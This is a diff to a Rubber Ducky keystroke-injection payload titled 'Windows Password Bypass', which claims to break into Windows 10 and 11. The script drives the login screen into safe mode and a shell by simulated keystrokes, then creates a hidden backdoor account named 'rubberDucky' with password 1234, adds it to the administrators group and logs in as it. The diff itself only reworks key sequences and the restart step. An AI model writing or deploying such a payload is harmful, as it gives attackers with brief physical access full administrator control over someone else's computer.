@@ -1,22 +1,17 @@
-REM Title: Example Payload
+REM Title: Windows Password Bypass
 REM Author: Tzur Soffer
 REM Description: Break into Windows 10 + 11
 REM Target: Windows 10, Windows 10
 REM Props: Hak5, Darren Kitchen, Korben
-REM Version: 1.1
+REM Version: 2.0
 REM Category: General
 
 REM get into safe mode
 STRING QQQQQQQQQ
 DELAY 3000
+HOLD SHIFT
 TAB
-DELAY 50
-TAB
-DELAY 50
-TAB
-DELAY 50
-TAB
-DELAY 50
+RELEASE SHIFT
 ENTER
 DELAY 100
 UP
@@ -82,12 +77,11 @@ DELAY 60000
 REM go into shell from login page
 STRING QQQQQQQQQ
 DELAY 3000
+HOLD SHIFT
 TAB
 DELAY 50
 TAB
-DELAY 50
-TAB
-DELAY 50
+RELEASE SHIFT
 ENTER
 DELAY 1000
 
@@ -96,19 +90,23 @@ STRING net user rubberDucky 1234 /add
 ENTER
 STRING net localgroup administrators rubberDucky /add
 ENTER
-STRING shutdown /r /t 0
+STRING shutdown /l
 ENTER
-DELAY 45000
+DELAY 10000
 
 REM login to new user
 STRING QQQQQQQQQ
 DELAY 3000
+HOLD SHIFT
 TAB
 DELAY 50
 TAB
 DELAY 50
 TAB
 DELAY 50
+TAB
+DELAY 50
+RELEASE SHIFT
 ENTER
 DELAY 500
 STRING 1234
